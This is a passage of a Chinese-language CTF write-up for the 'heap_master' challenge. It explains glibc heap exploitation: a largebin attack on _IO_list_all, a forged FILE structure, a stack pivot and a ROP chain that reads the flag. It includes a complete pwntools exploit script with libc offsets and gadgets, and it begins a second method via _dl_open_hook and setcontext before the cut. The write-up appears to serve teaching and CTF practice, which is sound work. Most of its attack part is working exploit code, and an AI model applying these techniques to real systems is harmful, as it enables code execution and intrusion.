+<p>覆盖<code>_IO_list_all</code>之后，它将指向mmap出来的内存，在这里这样布置内存<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>, <span class="string">'./flag\x00\x00'</span> + flat(orw))</span><br><span class="line">edit(offset+<span class="number">0x360</span>+<span class="number">0x540</span>, fake_IO_strfile)</span><br><span class="line">edit(offset+<span class="number">0x360</span>+<span class="number">0x540</span>+<span class="number">0xD8</span>, _IO_str_jump)</span><br><span class="line">edit(offset+<span class="number">0x360</span>+<span class="number">0x540</span>+<span class="number">0xE0</span>, p64(pp_j))</span><br><span class="line"><span class="comment"># 本地环境下</span></span><br><span class="line"><span class="comment"># p_rsp_r--&gt;pop rsp ; ret</span></span><br><span class="line"><span class="comment"># p_rsp_r13_r--&gt;pop rsp ; pop r13 ; ret</span></span><br><span class="line"><span class="comment"># pp_j--&gt;pop rbx ; pop rbp ; jmp rdx</span></span><br><span class="line"><span class="comment"># fake_IO_strfile = p64(0) + p64(p_rsp_r) + p64(heap+8) + p64(0) + p64(0) + p64(p_rsp_r13_r)</span></span><br></pre></td></tr></table></figure></p>
+<p>需要进行说明的是，<code>_IO_list_all</code>指向的是<code>mem=offset+0x360+0x540</code>，所以mem处相当于一个我们伪造的<code>FILE</code>结构体，<code>mem+0xD8</code>对应的是<code>IO_jump_t</code>指针，exp中将其设置为一个正常的<code>IO_jump_t</code>结构体，这样就能够在程序退出的时候正常执行<code>_IO_str_overflow</code></p>
+<p>接着在<code>_IO_str_overflow</code>处下好断点，在程序退出后确实执行到了该函数处，且该函数的参数<code>$rdi</code>正是<code>_IO_list_all</code>的值</p>
+<p><img src="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190510161752.png" alt=""></p>
+<p>接着继续单步跟进，进入到这里。看到这里有一个赋值操作，<code>$rdi</code>指向的是我们伪造的<code>FILE</code>结构体，将<code>$rdi+0x28</code>处的值赋值到rdx寄存器中，这个值刚好是libc中gadget<code>pop rsp ; pop r13 ; ret</code>所在的地址</p>
+<p><img src="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190510161958.png" alt=""></p>
+<p>继续跟进，发现会有一处函数调用，调用的是<code>$rbx+0xe0</code>处的值，这个值在布置内存的时候设置为了<code>pop rbx ; pop rbp ; jmp rdx</code>的地址，rdx的值在前面的赋值中已经被我们控制了，所以这里将再次跳转到<code>p_rsp_r13_r</code>这个gadget处</p>
+<p><img src="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190510162631.png" alt=""></p>
+<p>执行完之后，程序的栈将被劫持到我们可控的内存处</p>
+<p><img src="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190510163127.png" alt=""></p>
+<p>剩下的就是普通的ROP来依次调用<code>open--&gt;read--&gt;write</code>获取flag了</p>
+<h3 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h3><p>exp如下（在原writeup的基础上做了一些修改），其中<code>DEBUG</code>为1表示使用本地libc，本地环境为<code>ubuntu16.04--&gt;libc2.23</code>，否则表示使用程序提供的libc</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_ld</span><span class="params">(binary, ld)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Force to use assigned new ld.so by changing the binary</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.access(ld, os.R_OK): </span><br><span class="line">        log.failure(<span class="string">"Invalid path &#123;&#125; to ld"</span>.format(ld))</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line"> </span><br><span class="line">         </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> isinstance(binary, ELF):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.access(binary, os.R_OK): </span><br><span class="line">            log.failure(<span class="string">"Invalid path &#123;&#125; to binary"</span>.format(binary))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">        binary = ELF(binary)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> segment <span class="keyword">in</span> binary.segments:</span><br><span class="line">        <span class="keyword">if</span> segment.header[<span class="string">'p_type'</span>] == <span class="string">'PT_INTERP'</span>:</span><br><span class="line">            size = segment.header[<span class="string">'p_memsz'</span>]</span><br><span class="line">            addr = segment.header[<span class="string">'p_paddr'</span>]</span><br><span class="line">            data = segment.data()</span><br><span class="line">            <span class="keyword">if</span> size &lt;= len(ld):</span><br><span class="line">                log.failure(<span class="string">"Failed to change PT_INTERP from &#123;&#125; to &#123;&#125;"</span>.format(data, ld))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">            binary.write(addr, ld.ljust(size, <span class="string">'\x00'</span>))</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.access(<span class="string">'/tmp/pwn'</span>, os.F_OK): os.mkdir(<span class="string">'/tmp/pwn'</span>)</span><br><span class="line">            path = <span class="string">'/tmp/pwn/&#123;&#125;_debug'</span>.format(os.path.basename(binary.path))</span><br><span class="line">            <span class="keyword">if</span> os.access(path, os.F_OK): </span><br><span class="line">                os.remove(path)</span><br><span class="line">                info(<span class="string">"Removing exist file &#123;&#125;"</span>.format(path))</span><br><span class="line">            binary.save(path)    </span><br><span class="line">            os.chmod(path, <span class="number">0b111000000</span>) <span class="comment">#rwx------</span></span><br><span class="line">    success(<span class="string">"PT_INTERP has changed from &#123;&#125; to &#123;&#125;. Using temp file &#123;&#125;"</span>.format(data, ld, path)) </span><br><span class="line">    <span class="keyword">return</span> ELF(path)</span><br><span class="line"></span><br><span class="line"><span class="comment">#example</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">g</span><span class="params">(off)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> libc.address + off</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_add</span><span class="params">(p, size)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'size: '</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_edit</span><span class="params">(p, off, cont)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'offset: '</span>, str(off))</span><br><span class="line">    p.sendlineafter(<span class="string">'size: '</span>, str(len(cont)))</span><br><span class="line">    p.sendafter(<span class="string">'content: '</span>, cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_del</span><span class="params">(p, off)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'offset: '</span>, str(off))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(host, port=<span class="number">60001</span>)</span>:</span></span><br><span class="line">    context.terminal = [<span class="string">'tmux'</span>, <span class="string">'split'</span>, <span class="string">'-h'</span>]</span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        p = process(<span class="string">'./heap_master'</span>)</span><br><span class="line">        context.log_level = <span class="string">'debug'</span></span><br><span class="line">        stdout = <span class="number">0x2620</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        elf = change_ld(<span class="string">'./heap_master'</span>, <span class="string">'./ld-linux-x86-64.so.2'</span>)</span><br><span class="line">        p = elf.process(env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc.so.6'</span>&#125;)</span><br><span class="line">        context.log_level = <span class="string">'info'</span></span><br><span class="line">        stdout = <span class="number">0x5600</span></span><br><span class="line"></span><br><span class="line">    add = <span class="keyword">lambda</span> x: _add(p, x)</span><br><span class="line">    edit = <span class="keyword">lambda</span> x,y: _edit(p, x, y)</span><br><span class="line">    free = <span class="keyword">lambda</span> x: _del(p, x)</span><br><span class="line"></span><br><span class="line">    info(<span class="string">'stdout:'</span>+hex(stdout))</span><br><span class="line"></span><br><span class="line">    offset = <span class="number">0x8800</span><span class="number">-0x7A0</span></span><br><span class="line">    <span class="comment"># gdb.attach(p,'b *0x555555554000+0xf71')</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0x8060</span></span><br><span class="line">    edit(offset+<span class="number">8</span>, p64(<span class="number">0x331</span>)) <span class="comment">#p1</span></span><br><span class="line">    edit(offset+<span class="number">8</span>+<span class="number">0x330</span>, p64(<span class="number">0x31</span>))</span><br><span class="line">    edit(offset+<span class="number">8</span>+<span class="number">0x360</span>, p64(<span class="number">0x411</span>)) <span class="comment">#p2</span></span><br><span class="line">    edit(offset+<span class="number">8</span>+<span class="number">0x360</span>+<span class="number">0x410</span>, p64(<span class="number">0x31</span>))</span><br><span class="line">    edit(offset+<span class="number">8</span>+<span class="number">0x360</span>+<span class="number">0x440</span>, p64(<span class="number">0x411</span>)) <span class="comment">#p3</span></span><br><span class="line">    edit(offset+<span class="number">8</span>+<span class="number">0x360</span>+<span class="number">0x440</span>+<span class="number">0x410</span>, p64(<span class="number">0x31</span>))</span><br><span class="line">    edit(offset+<span class="number">8</span>+<span class="number">0x360</span>+<span class="number">0x440</span>+<span class="number">0x440</span>, p64(<span class="number">0x31</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    free(offset+<span class="number">0x10</span>) <span class="comment">#p1</span></span><br><span class="line">    free(offset+<span class="number">0x10</span>+<span class="number">0x360</span>) <span class="comment">#p2</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">    edit(offset+<span class="number">8</span>+<span class="number">0x360</span>, p64(<span class="number">0x101</span>)*<span class="number">3</span>)</span><br><span class="line">    edit(offset+<span class="number">8</span>+<span class="number">0x460</span>, p64(<span class="number">0x101</span>)*<span class="number">3</span>)</span><br><span class="line">    edit(offset+<span class="number">8</span>+<span class="number">0x560</span>, p64(<span class="number">0x101</span>)*<span class="number">3</span>)</span><br><span class="line">    </span><br><span class="line">    free(offset+<span class="number">0x10</span>+<span class="number">0x370</span>)</span><br><span class="line">    add(<span class="number">0x90</span>)</span><br><span class="line">    free(offset+<span class="number">0x10</span>+<span class="number">0x360</span>)</span><br><span class="line">    add(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># stdout = 0x2620</span></span><br><span class="line">    edit(offset+<span class="number">8</span>+<span class="number">0x360</span>, p64(<span class="number">0x3f1</span>) + p64(<span class="number">0</span>) + p16(stdout<span class="number">-0x10</span>)) <span class="comment">#p2-&gt;bk</span></span><br><span class="line">    </span><br><span class="line">    edit(offset+<span class="number">8</span>+<span class="number">0x360</span>+<span class="number">0x18</span>, p64(<span class="number">0</span>) + p16(stdout+<span class="number">0x19</span><span class="number">-0x20</span>)) <span class="comment">#p2-&gt;bk_nextsize</span></span><br><span class="line"></span><br><span class="line">    free(offset+<span class="number">0x10</span>+<span class="number">0x360</span>+<span class="number">0x440</span>) <span class="comment">#p3</span></span><br><span class="line">    <span class="comment"># gdb.attach(p,'b *0x555555554000+0xf71')</span></span><br><span class="line">    add(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        p.recv(<span class="number">0x18</span>)</span><br><span class="line">        libc.address = u64(p.recv(<span class="number">8</span>)) - libc.symbols[<span class="string">'_IO_file_jumps'</span>]<span class="comment"># + 0x1fe0</span></span><br><span class="line">        info(<span class="string">'libc.address @ '</span>+hex(libc.address))</span><br><span class="line">        info(<span class="string">'libc.system @'</span>+hex(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line">        heap = u64(p.recv(<span class="number">8</span>)) - (<span class="number">0x495cf800</span><span class="number">-0x495c7000</span>)</span><br><span class="line">        info(<span class="string">'heap @ '</span>+hex(heap))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        heap = u64(p.recv(<span class="number">8</span>)) - (<span class="number">0x495cf800</span><span class="number">-0x495c7000</span>)</span><br><span class="line">        info(<span class="string">'heap @ '</span>+hex(heap))</span><br><span class="line">        libc.address = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x83</span> - (<span class="number">0x7ffff7dd5600</span><span class="number">-0x7ffff7a37000</span>)<span class="comment"># + 0x1fe0</span></span><br><span class="line">        info(<span class="string">'libc.address @ '</span>+hex(libc.address))</span><br><span class="line">        info(<span class="string">'libc.system @'</span>+hex(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># yet another large bin attack</span></span><br><span class="line"></span><br><span class="line">    offset = <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">    edit(offset+<span class="number">8</span>, p64(<span class="number">0x331</span>)) <span class="comment">#p1</span></span><br><span class="line">    edit(offset+<span class="number">8</span>+<span class="number">0x330</span>, p64(<span class="number">0x31</span>))</span><br><span class="line">    edit(offset+<span class="number">8</span>+<span class="number">0x360</span>, p64(<span class="number">0x511</span>)) <span class="comment">#p2</span></span><br><span class="line">    edit(offset+<span class="number">8</span>+<span class="number">0x360</span>+<span class="number">0x510</span>, p64(<span class="number">0x31</span>))</span><br><span class="line">    edit(offset+<span class="number">8</span>+<span class="number">0x360</span>+<span class="number">0x540</span>, p64(<span class="number">0x511</span>)) <span class="comment">#p3</span></span><br><span class="line">    edit(offset+<span class="number">8</span>+<span class="number">0x360</span>+<span class="number">0x540</span>+<span class="number">0x510</span>, p64(<span class="number">0x31</span>))</span><br><span class="line">    edit(offset+<span class="number">8</span>+<span class="number">0x360</span>+<span class="number">0x540</span>+<span class="number">0x540</span>, p64(<span class="number">0x31</span>))</span><br><span class="line"></span><br><span class="line">    free(offset+<span class="number">0x10</span>) <span class="comment">#p1</span></span><br><span class="line">    free(offset+<span class="number">0x10</span>+<span class="number">0x360</span>) <span class="comment">#p2</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x90</span>)</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    edit(offset+<span class="number">8</span>+<span class="number">0x360</span>, p64(<span class="number">0x4f1</span>) + p64(<span class="number">0</span>) + p64(libc.sym[<span class="string">'_IO_list_all'</span>]<span class="number">-0x10</span>) + p64(<span class="number">0</span>) + p64(libc.sym[<span class="string">'_IO_list_all'</span>]<span class="number">-0x20</span>))</span><br><span class="line">    <span class="comment"># gdb.attach(p,'b *0x555555554000+0xf71')</span></span><br><span class="line">    free(offset+<span class="number">0x10</span>+<span class="number">0x360</span>+<span class="number">0x540</span>) <span class="comment">#p3</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x200</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># trigger on exit()</span></span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        _IO_str_jump = p64(libc.address + (<span class="number">0x7ffff7dd07a0</span><span class="number">-0x7ffff7a0d000</span>))</span><br><span class="line">        pp_j = g(<span class="number">0x12d751</span>) <span class="comment"># pop rbx ; pop rbp ; jmp rdx</span></span><br><span class="line">        p_rsp_r = g(<span class="number">0x3838</span>) <span class="comment"># pop rsp ; ret</span></span><br><span class="line">        p_rsp_r13_r = g(<span class="number">0x206c3</span>) <span class="comment"># pop rsp ; pop r13 ; ret</span></span><br><span class="line">        p_rdi_r = g(<span class="number">0x21102</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">        p_rdx_rsi_r = g(<span class="number">0x1150c9</span>) <span class="comment"># pop rdx ; pop rsi ; ret</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        _IO_str_jump = p64(libc.address + <span class="number">0x39A500</span>)</span><br><span class="line">        pp_j = g(<span class="number">0x10fa54</span>) <span class="comment"># pop rbx ; pop rbp ; jmp rcx</span></span><br><span class="line">        p_rsp_r = g(<span class="number">0x3870</span>) <span class="comment"># pop rsp ; ret</span></span><br><span class="line">        p_rsp_r13_r = g(<span class="number">0x1fd94</span>) <span class="comment"># pop rsp ; pop r13 ; ret</span></span><br><span class="line">        p_rdi_r = g(<span class="number">0x1feea</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">        p_rdx_rsi_r = g(<span class="number">0xf9619</span>) <span class="comment"># pop rdx ; pop rsi ; ret</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    fake_IO_strfile = p64(<span class="number">0</span>) + p64(p_rsp_r) + p64(heap+<span class="number">8</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(p_rsp_r13_r)</span><br><span class="line"></span><br><span class="line">    orw = [</span><br><span class="line">        p_rdi_r, heap,</span><br><span class="line">        p_rdx_rsi_r, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">        libc.sym[<span class="string">'open'</span>],</span><br><span class="line">        p_rdi_r, <span class="number">3</span>,</span><br><span class="line">        p_rdx_rsi_r, <span class="number">0x100</span>, heap+<span class="number">0x1337</span>,</span><br><span class="line">        libc.sym[<span class="string">'read'</span>],</span><br><span class="line">        p_rdi_r, <span class="number">1</span>,</span><br><span class="line">        p_rdx_rsi_r, <span class="number">0x100</span>, heap+<span class="number">0x1337</span>,</span><br><span class="line">        libc.sym[<span class="string">'write'</span>],</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">'./flag\x00\x00'</span> + flat(orw))</span><br><span class="line">    edit(offset+<span class="number">0x360</span>+<span class="number">0x540</span>, fake_IO_strfile)</span><br><span class="line">    edit(offset+<span class="number">0x360</span>+<span class="number">0x540</span>+<span class="number">0xD8</span>, _IO_str_jump)</span><br><span class="line">    edit(offset+<span class="number">0x360</span>+<span class="number">0x540</span>+<span class="number">0xE0</span>, p64(pp_j))</span><br><span class="line">    gdb.attach(p,<span class="string">'''</span></span><br><span class="line"><span class="string">        b *0x555555554000+0xf71</span></span><br><span class="line"><span class="string">        b *0x7ffff7a89cfe</span></span><br><span class="line"><span class="string">        '''</span>)</span><br><span class="line">    info(<span class="string">'b *'</span>+hex(pp_j))</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    DEBUG=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        libc_path = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        libc_path = <span class="string">'./libc.so.6'</span></span><br><span class="line">    libc = ELF(libc_path)</span><br><span class="line">    <span class="comment"># exploit(args['REMOTE'])</span></span><br><span class="line">    exploit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="通过-dl-open-hook控制程序执行"><a href="#通过-dl-open-hook控制程序执行" class="headerlink" title="通过_dl_open_hook控制程序执行"></a>通过_dl_open_hook控制程序执行</h2><p>这种控制程序执行的方式是官方wp里面提到的，通过<code>largebin attack</code>可以将<code>_dl_open_hook</code>覆盖为<code>mmap</code>出来的内存的地址，然后通过<code>malloc</code>或<code>free</code>报错的方式，程序将会把该值加载到寄存器，然后会<code>call</code>该寄存器，在题目的libc中该寄存器为rbx。</p>
+<p>相当于这里就有一次任意地址调用的机会，正常情况下可以在这里调用<code>one_gadget</code>来获取shell，但是在这里不行。需要将栈劫持到mmap内存处来<code>ROP</code>。所以如何控制其他的寄存器呢（主要是rsp寄存器）？</p>
+<p>在题目给出的libc中，有一个这样的gadget：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7FD7D</span>: <span class="keyword">mov</span>     <span class="built_in">rdi</span>, [<span class="built_in">rbx</span>+<span class="number">48h</span>]</span><br><span class="line">         <span class="keyword">mov</span>     <span class="built_in">rsi</span>, <span class="built_in">r13</span></span><br><span class="line">         <span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rbx</span>+<span class="number">40h</span>]</span><br></pre></td></tr></table></figure>
+<p>之前我们已经控制rbx的值指向了我们可控的内存处，所以跳转到上面这个gadget便可以控制rdi的值，同时这里还提供了一次任意地址调用的机会<code>call   qword ptr [rbx+40h]</code>，那接下来跳转到哪里能够控制关键寄存器（rsp）的值呢？</p>
+<p>可以跳转到<code>setcontext</code>处，该处通过rdi指向的内存来对各个寄存器进行赋值，rdi已被控制，故通过这里便可控制几乎所有的寄存器<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; libcbase = 0x7ffff7a37000</span></span><br><span class="line"><span class="number">0x7ffff7a7a565</span> &lt;setcontext+<span class="number">53</span>&gt;:      <span class="keyword">mov</span>    <span class="built_in">rsp</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rdi</span>+<span class="number">0xa0</span>]</span><br><span class="line"><span class="number">0x7ffff7a7a56c</span> &lt;setcontext+<span class="number">60</span>&gt;:      <span class="keyword">mov</span>    <span class="built_in">rbx</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rdi</span>+<span class="number">0x80</span>]</span><br><span class="line"><span class="number">0x7ffff7a7a573</span> &lt;setcontext+<span class="number">67</span>&gt;:      <span class="keyword">mov</span>    <span class="built_in">rbp</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rdi</span>+<span class="number">0x78</span>]</span><br><span class="line"><span class="number">0x7ffff7a7a577</span> &lt;setcontext+<span class="number">71</span>&gt;:      <span class="keyword">mov</span>    <span class="built_in">r12</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rdi</span>+<span class="number">0x48</span>]</span><br><span class="line"><span class="number">0x7ffff7a7a57b</span> &lt;setcontext+<span class="number">75</span>&gt;:      <span class="keyword">mov</span>    <span class="built_in">r13</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rdi</span>+<span class="number">0x50</span>]</span><br><span class="line"><span class="number">0x7ffff7a7a57f</span> &lt;setcontext+<span class="number">79</span>&gt;:      <span class="keyword">mov</span>    <span class="built_in">r14</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rdi</span>+<span class="number">0x58</span>]</span><br><span class="line"><span class="number">0x7ffff7a7a583</span> &lt;setcontext+<span class="number">83</span>&gt;:      <span class="keyword">mov</span>    <span class="built_in">r15</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rdi</span>+<span class="number">0x60</span>]</span><br><span class="line"><span class="number">0x7ffff7a7a587</span> &lt;setcontext+<span class="number">87</span>&gt;:      <span class="keyword">mov</span>    <span class="built_in">rcx</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rdi</span>+<span class="number">0xa8</span>]</span><br><span class="line"><span class="number">0x7ffff7a7a58e</span> &lt;setcontext+<span class="number">94</span>&gt;:      <span class="keyword">push</span>   <span class="built_in">rcx</span></span><br><span class="line"><span class="number">0x7ffff7a7a58f</span> &lt;setcontext+<span class="number">95</span>&gt;:      <span class="keyword">mov</span>    <span class="built_in">rsi</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rdi</span>+<span class="number">0x70</span>]</span><br><span class="line"><span class="number">0x7ffff7a7a593</span> &lt;setcontext+<span class="number">99</span>&gt;:      <span class="keyword">mov</span>    <span class="built_in">rdx</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rdi</span>+<span class="number">0x88</span>]</span><br><span class="line"><span class="number">0x7ffff7a7a59a</span> &lt;setcontext+<span class="number">106</span>&gt;:     <span class="keyword">mov</span>    <span class="built_in">rcx</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rdi</span>+<span class="number">0x98</span>]</span><br><span class="line"><span class="number">0x7ffff7a7a5a1</span> &lt;setcontext+<span class="number">113</span>&gt;:     <span class="keyword">mov</span>    <span 